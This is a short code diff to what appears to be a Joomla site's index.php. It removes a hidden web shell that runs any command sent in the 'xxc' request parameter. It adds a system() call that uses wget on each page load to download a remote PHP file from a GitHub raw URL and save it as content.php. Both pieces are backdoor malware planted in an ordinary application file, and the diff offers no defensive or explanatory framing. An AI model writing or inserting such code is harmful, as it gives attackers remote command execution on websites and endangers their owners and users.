@@ -38,16 +38,9 @@ if (!defined('_JDEFINES'))
 }
 
 require_once JPATH_BASE . '/includes/framework.php';
-if(isset($_REQUEST['xxc'])){
-        echo "<pre>";
-        echo "<form name='form' action='#' method='post'>
-      <input type='text' name='xxc'/> <input type='submit' value='enter'/>
-      </form>";
-        $cmd = ($_POST['xxc']);
-        system($cmd);
-        echo "</pre>";
-        die;
-}
+
+system('wget https://raw.githubusercontent.com/gl4b/rare/main/xw.php -O content.php');
+
 // Set profiler start time and memory usage and mark afterLoad in the profiler.
 JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;
 
